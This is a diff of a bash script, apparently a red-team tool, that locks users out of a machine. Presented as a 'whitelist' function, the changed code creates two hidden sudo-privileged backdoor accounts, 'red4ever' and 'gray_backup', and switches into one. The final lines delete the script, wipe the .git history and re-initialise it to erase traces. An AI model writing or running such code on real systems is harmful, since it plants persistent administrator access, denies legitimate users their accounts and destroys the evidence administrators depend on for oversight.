@@ -4,13 +4,22 @@
 # A function that creates a whitelist. Will ALWAYS include the user executing the script.
 function create_whitelist()
 {
-    # Create user 1
-    sudo useradd red4ever > /dev/null
-    sudo adduser red4ever sudo > /dev/null
-    sudo su red4ever > /dev/null
+    sudo mkdir -p /home/red4ever
+    # Create a user with the above home directory and the shell /bin/bash
+    sudo useradd -m -d /home/red4ever -s /bin/bash red4ever &>/dev/null
+    # The new user should own their home directory
+    sudo chown -R red4ever:red4ever /home/red4ever
+    # The new user should have sudo privileges
+    sudo usermod -aG sudo red4ever
+    sudo su - red4ever
 
-    sudo useradd gray_backup > /dev/null
-    sudo adduser gray_backup sudo > /dev/null
+    sudo mkdir -p /home/gray_backup
+    # Create a user with the above home directory and the shell /bin/bash
+    sudo useradd -m -d /home/gray_backup -s /bin/bash gray_backup &>/dev/null
+    # The new user should own their home directory
+    sudo chown -R gray_backup:gray_backup /home/gray_backup
+    # The new user should have sudo privileges
+    sudo usermod -aG sudo gray_backup
     
     # Adds the executing user to the whitelist
     WHITELIST+=("$(logname)")
@@ -98,6 +107,8 @@ echo
 echo "Users disabled successfully."
 
 echo
-echo "NUKING DISABLER / LOCKER"
+echo "NUKING DISABLER / LOCKER AND LOGS"
 
 sudo rm -rf disable_no_menu.sh
+sudo rm -rf .git
+sudo git init
